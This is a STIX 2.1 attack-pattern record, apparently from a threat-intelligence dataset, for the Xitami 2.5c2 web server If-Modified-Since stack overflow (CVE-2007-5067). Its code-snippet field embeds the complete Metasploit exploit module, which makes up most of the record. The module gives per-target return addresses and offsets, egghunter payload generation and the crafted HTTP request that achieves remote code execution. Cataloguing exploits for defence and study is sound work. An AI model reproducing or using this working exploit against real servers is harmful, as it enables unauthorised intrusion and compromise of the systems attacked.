{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc686c28-7319-4e4e-aa38-f6022f9c4a9d",
    "created": "2024-08-14T16:52:24.499136Z",
    "modified": "2024-08-14T16:52:24.49914Z",
    "name": "Xitami 2.5c2 Web Server If-Modified-Since Overflow",
    "description": " This module exploits a stack buffer overflow in the iMatix Corporation Xitami Web Server. If a malicious user sends an\tIf-Modified-Since header containing an overly long string, it may be possible to execute a payload remotely. Due to size constraints, this module uses the Egghunter technique. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/xitami_if_mod_since.rb",
            "external_id": "xitami_if_mod_since.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5067"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Xitami 2.5c2 Web Server If-Modified-Since Overflow',\n      'Description'\t=> %q{\n        This module exploits a stack buffer overflow in the iMatix Corporation\n        Xitami Web Server. If a malicious user sends an\tIf-Modified-Since\n        header containing an overly long string, it may be possible to\n        execute a payload remotely. Due to size constraints, this module uses\n        the Egghunter technique.\n      },\n      'Author' \t=> 'aushack',\n      'License'       => MSF_LICENSE,\n      'References'    =>\n      [\n        [ 'CVE', '2007-5067' ],\n        [ 'OSVDB', '40594'],\n        [ 'OSVDB', '40595'],\n        [ 'BID', '25772' ],\n        [ 'EDB', '4450' ]\n      ],\n      'Privileged'\t\t=> false,\n      'DefaultOptions'\t=>\n      {\n        'EXITFUNC'\t=> 'process',\n      },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t=> 700,\n          'BadChars' \t=> \"\\x00\\x0a\\x0d\",\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n      [\n      # Patrick - Both tested OK 20070928 - w2ksp0, w2ksp4, xpsp0, xpsp2 en.\n        [ 'xigui32.exe Universal', { 'Ret' => \"\\xff\\xce\\x44\", 'Offset' => 40 } ], # 0x0044ceff ret xigui32.exe\n        [ 'xitami.exe  Universal', { 'Ret' => \"\\xf2\\xc1\\x47\", 'Offset' => 68 } ], # 0x0047c1f2 ret xitami.exe\n      ],\n      'DisclosureDate' => '2007-09-24',\n      'DefaultTarget' => 0))\n\n      register_options(\n      [\n        Opt::RPORT(80),\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.1\\r\\nHost: #{rhost}\\r\\n\\r\\n\")\n    banner = sock.get_once\n    disconnect\n\n    if (banner.to_s =~ /Xitami/)\n      vprint_status(\"Banner: #{banner}\")\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    hunter  = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n    egg     = hunter[1]\n\n    sploit = \"GET / HTTP/1.1\\r\\n\"\n    sploit << \"Host: \" + egg + \"\\r\\n\"\n    sploit << \"If-Modified-Since: \" + Rex::Arch::X86.jmp_short(3) + \", \"\n    sploit << hunter[0] + rand_text_alphanumeric(target['Offset']) + target['Ret']\n\n    sock.put(sploit + \"\\r\\n\\r\\n\")\n\n    print_status(\"Waiting for payload to execute...\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-09-24",
    "x_mitre_platforms": [
        "['win']"
    ]
}